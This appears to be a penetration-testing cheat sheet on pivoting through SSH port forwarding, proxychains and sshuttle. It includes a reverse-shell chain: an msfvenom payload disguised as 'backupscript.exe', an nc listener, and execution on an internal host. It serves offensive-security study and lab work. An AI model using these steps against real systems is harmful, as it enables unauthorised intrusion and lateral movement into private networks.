We can use this to access internal ports on servers if we have SSH access.

Local Port Forwarding
```bash
# example of connecting KALI port 8000 to VICTIM port 8080
ssh -L 8000:localhost:8080 <user>@<ip_address>

# Forward multiple ports
ssh -L 8000:localhost:8000 -L 1234:localhost:3306 <user>@<ip_address>
```

Dynamic Port Forwarding (SOCKS)
```bash
# check /etc/proxychains.conf
...SNIP...
socks4 	127.0.0.1 9050

# example of dynamic port forward over 9050
ssh -D 9050 <user>@<victim_ip>

# running commands over proxy
proxychains <cmds>
```

Remote/Reverse Port Forwarding
```bash
# Example of reverse shell THROUGH a pivot point
# Machines
Attacker box # us
Pivot box    # 2+ interfaces
Internal box # internal only

# Initial dynamic port forward
ssh -D 9050 <user>@<pivot_box_ip>

# Connection to internal box
proxychains xfreerdp /v:<internal_box_ip> ...

# Setup SSH remote port forwarding to forward connections from pivot_box:8080 to attacker_box:4444
ssh -R <pivot_box_INTERNAL_IP>:8080:0.0.0.0:4444 <user>@<pivot_box_ip>

# Create rev shell exe file
msfvenom -p windows/x64/shell_reverse_tcp lhost=<InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

# Transfer over -- various ways

# Set up listener on attack box
nc -lvnp 4444

# Fire reverse shell on internal box
.\backupscript.exe
```

Sshuttle
	Sshuttle is another tool written in Python which removes the need to configure proxychains
```bash
# install
sudo apt-get install sshuttle

# connecting and adding routes
sudo sshuttle -r <user>@<ip_address> <ip_subnet/CIDR> -v 

now run commands against internal IPs without need for proxychains
```